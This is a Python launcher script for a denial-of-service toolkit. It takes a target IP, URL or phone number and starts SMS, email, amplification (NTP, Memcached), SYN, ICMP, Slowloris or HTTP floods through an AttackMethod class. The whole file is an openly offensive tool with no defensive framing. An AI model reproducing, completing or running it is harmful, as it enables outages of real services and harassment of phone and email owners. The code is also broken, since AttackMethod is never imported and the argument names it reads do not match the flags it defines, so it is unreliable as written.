# Created by NONPLAY
# Import modules
import os
import sys
import argparse

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))



# Parse args
parser = argparse.ArgumentParser(description="Denial-of-service ToolKit")
parser.add_argument(
    "-ip",
    type=str,
    metavar="<IP:PORT, URL, PHONE>",
    help="Target ip:port, url or phone",
)
parser.add_argument(
    "-m",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
    help="Attack method",
)
parser.add_argument(
    "-ti", type=int, default=10, metavar="<time>", help="time in secounds"
)
parser.add_argument(
    "-t", type=int, default=3, metavar="<threads>", help="threads count (1-200)"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target


if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Run ddos attack
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
